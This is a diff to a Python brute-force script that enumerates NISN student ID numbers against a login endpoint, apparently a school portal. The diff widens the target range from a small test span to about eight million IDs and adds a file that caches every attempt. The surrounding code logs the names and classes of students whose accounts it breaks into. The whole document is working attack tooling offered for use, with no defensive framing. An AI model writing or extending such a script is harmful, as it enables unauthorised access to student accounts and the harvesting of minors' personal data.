@@ -16,8 +16,9 @@ class Colors:
     CYAN = '\033[96m'
     RESET = '\033[0m'
 
-# File to log successful logins
+# Files to log successful logins and cache attempts
 log_file = "logs.txt"
+cache_file = "cache.txt"
 
 # Headers for login request
 login_headers = {
@@ -118,6 +119,11 @@ def log_success(nisn, class_name, full_name):
         f.write(f"[{timestamp}] [{class_name}] [{full_name}] : [{nisn}]\n")
     print(f"{Colors.GREEN}>> User details logged to {log_file}{Colors.RESET}")
 
+# Function to log attempt to cache
+def log_attempt(attempt_number, nisn):
+    with open(cache_file, 'a') as f:
+        f.write(f"[{attempt_number}] {nisn}\n")
+
 # Function to listen for exit command
 def exit_listener():
     global running
@@ -132,16 +138,21 @@ def exit_listener():
 def main():
     global running
     
-    start_nisn = 89600040  # Starting from 002000000
-    end_nisn = 89600050    # Ending at 009999999
+    start_nisn = 2000000  # Starting from 002000000
+    end_nisn = 9999999    # Ending at 009999999
     
     print(f"{Colors.BLUE}[*] Starting brute force attack from {start_nisn} to {end_nisn}{Colors.RESET}")
     print(f"{Colors.BLUE}[*] Results will be logged to {log_file}{Colors.RESET}")
+    print(f"{Colors.BLUE}[*] Attempts will be cached in {cache_file}{Colors.RESET}")
     print(f"{Colors.YELLOW}[*] Type 'exit' at any time to stop the script{Colors.RESET}")
     
     # Create or clear the log file
     with open(log_file, 'w') as f:
         f.write(f"# Brute Force Results - {datetime.now()}\n")
+    
+    # Create or clear the cache file
+    with open(cache_file, 'w') as f:
+        f.write(f"# Brute Force Attempts - {datetime.now()}\n")
     
     # Start the exit listener in a separate thread
     exit_thread = threading.Thread(target=exit_listener)
@@ -161,6 +172,9 @@ def main():
         attempts += 1
         
         print(f"{Colors.CYAN}>> Attempting login for NISN: {nisn} (Attempt #{attempts}){Colors.RESET}")
+        
+        # Log attempt to cache file
+        log_attempt(attempts, nisn)
         
         # Try login
         token = try_login(nisn)
